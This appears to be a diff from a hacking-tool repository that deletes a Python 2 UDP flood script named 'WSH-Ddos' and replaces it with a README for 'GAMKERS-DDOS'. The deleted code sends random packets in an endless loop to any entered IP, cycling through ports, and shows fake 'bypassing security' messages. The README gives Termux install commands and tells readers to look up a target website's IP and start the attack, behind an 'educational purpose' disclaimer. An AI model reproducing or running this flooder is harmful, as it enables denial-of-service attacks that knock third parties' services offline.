@@ -1,52 +1,41 @@
-print ("\033[92m")
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+Distributed Denial Of Service (DDoS) attacks are a subclass of denial of service (DoS) attacks. A DDoS attack involves multiple connected online devices, collectively known as a botnet, which are used to overwhelm a target website with fake traffic.
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
 
-os.system("clear")
-os.system("figlet WSH-Ddos")
-print
-print "Coded By : WHITE SKULLS"
-print "Author   : WHITE SKULLS"
-print "Github   : githu.com/whiteskullshacker"
-print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
-os.system("clear")
-os.system("figlet WSH-Ddos")
-print("Team : WHITESKULLS")
-print ("\033[92m")
-print "________________TRYING TO REACH THE SERVER_____________________"
-time.sleep(5)
-print "_________________ESTABLISHING CONNECTION_______________________"
-time.sleep(5)
-print "_________0100100 BYPASSING SECURITY LAYER 001010_______________"
-time.sleep(5)
-print "_________________CONNECTION ESTABLISHED________________________"
-time.sleep(5)
-print "    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+Note: THIS TOOL IS JUST ONLY FOR EDUCATIONAL PURPOSE..GIVING DDOS ATTACKs WITHOUT SITE OWNER'S PERMISSION IS ILLEGAL.. SO USE IT AT YOUR OWN RISK.. WE'LL BE NOT RESPONSIBLE FOR ANY TYPES OF MISISSUES!!!
+
+
+How To Install GAMKERS-DDOS In Termux
+The Tool Installation Process Is Very Easy.. Just Open Your Termux & Type This Provided Commands!!
+
+$ apt update && apt upgrade
+
+$ pkg install python
+
+$ pkg install python2
+
+$ pkg install git
+
+$ pkg install figlet
+
+$ git clone https://github.com/gamkers/GAMKERS-DDOS.git
+
+$ cd GAMKERS-DDOS
+
+$ chmod +x GAMKERS-DDOS.py
+
+$ python2 GAMKERS-DDOS.py
+
+
+To Run
+
+$ cd GAMKERS-DDOS
+
+$ python2 GAMKERS-DDOS.py
+
+
+Your Tool Install & Setup Done!!..Now Go To Google & Search`Website IP Finder`Now Open The 1st Wesite & Place Your Target Website Url e.g. www.biribaba.com..
+
+
+After Getting The Website IP , Copy The IP & Come To The Termux.. Now Paste The Target Website IP On `Ip Target:` & Give The Port Number `8080`
+
+Booom!! Your Ddos Attack Had Been Started...
